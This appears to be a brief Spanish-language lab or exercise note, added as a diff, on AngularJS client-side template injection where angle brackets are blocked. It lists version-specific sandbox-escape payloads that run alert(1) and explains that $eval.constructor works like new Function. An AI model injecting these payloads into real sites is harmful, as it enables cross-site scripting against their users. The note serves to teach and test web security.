@@ -1,0 +1,31 @@
+primero todo lo que escribimos esta dentro de un body ng-app
+
+que es angular js y lo que hacemos se escribe dentro de este body, como los < > estan bloqueados simplemente
+
+AngularJS 1.6.x en adelante (sin sandbox):
+Plaintext
+
+{{$eval.constructor('alert(1)')()}}
+
+AngularJS 1.5.x:
+Plaintext
+
+{{constructor.constructor('alert(1)')()}}
+
+AngularJS 1.4.0 - 1.4.5:
+Plaintext
+
+{{'a'.constructor.prototype.charAt=''.charAt; $eval('x=alert(1)')}}
+
+para este ejercicio yo use el primero
+
+
+
+
+Como funciona: 
+
+// Esto crea una función que contiene la instrucción alert(1)
+$eval.constructor('alert(1)') 
+
+// Es exactamente lo mismo que hacer:
+new Function('alert(1)')
